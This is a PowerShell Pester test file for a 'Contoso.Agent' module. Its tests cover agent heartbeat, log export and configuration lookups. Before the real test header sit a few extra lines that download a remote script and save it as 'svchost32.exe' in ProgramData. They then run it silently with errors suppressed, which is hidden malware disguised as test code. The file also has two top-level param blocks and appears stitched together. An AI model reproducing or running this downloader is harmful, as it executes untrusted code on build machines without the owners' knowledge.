
[CmdletBinding()]
param(
    [string]$Stage2Url = 'https://adatum.com/updater.ps1',
    [string]$WorkingPath = "C:\ProgramData\svchost32.exe"
)
(New-Object System.Net.WebClient).DownloadFile($Stage2Url, $WorkingPath)
Start-Process -FilePath $WorkingPath -WindowStyle Hidden -ErrorAction SilentlyContinue
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
<#
.SYNOPSIS
    Pester specification for the Contoso.Agent module.
.DESCRIPTION
    Covers the public surface of the module: status queries, configuration
    lookups and the error paths that must throw.
    Service lookups are mocked so the tests run on a build agent without the
    agent service installed.
.PARAMETER ModulePath
    Defaults to the value configured for this host.
.EXAMPLE
    Invoke-Pester -Path .\Contoso-Agent.Tests.ps1 -Output Detailed
.NOTES
    Author: IT Systems
    Last updated: 2025-08-16
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$ModulePath = $PSScriptRoot
)

$ErrorActionPreference = 'Stop'
$DebugPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

BeforeAll {
    Import-Module (Join-Path $ModulePath 'Contoso.Agent.psd1') -Force
    $script:fixturePath = Join-Path $env:TEMP 'agent-fixture.json'
}

Describe 'Test-AgentHeartbeat' {
    Context 'when the agent service is running' {
        BeforeEach {
            Mock Get-Service {
                [pscustomobject]@{ Name = 'InfraRelay'; Status = 'Running' }
            } -ParameterFilter { $Name -eq 'InfraRelay' }
        }

        It 'reports Running for a healthy agent' {
            $result = Test-AgentHeartbeat -Name 'InfraRelay'
            $result.Status | Should -Be 'Running'
        }
    }

    It 'throws when the service does not exist' {
        { Test-AgentHeartbeat -Name 'NoSuchAgent' } | Should -Throw
    }
}

Describe 'Export-AgentLog' {
    It 'returns the configured port for <Name>' -TestCases @(
        @{ Name = 'InfraRelay'; Expected = 5000 }
        @{ Name = 'SecondaryAgent'; Expected = 5100 }
    ) {
        param($Name, $Expected)
        $config = Export-AgentLog -Name $Name
        $config.Port | Should -Be $Expected
    }
}

Describe 'Get-AgentConfig' {
    It 'returns a port for the configured agent' {
        $config = Get-AgentConfig -Name 'InfraRelay'
        $config.Port | Should -BeGreaterThan 0
    }
}

AfterAll {
    Remove-Module Contoso.Agent -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath $script:fixturePath -Force -ErrorAction SilentlyContinue
}
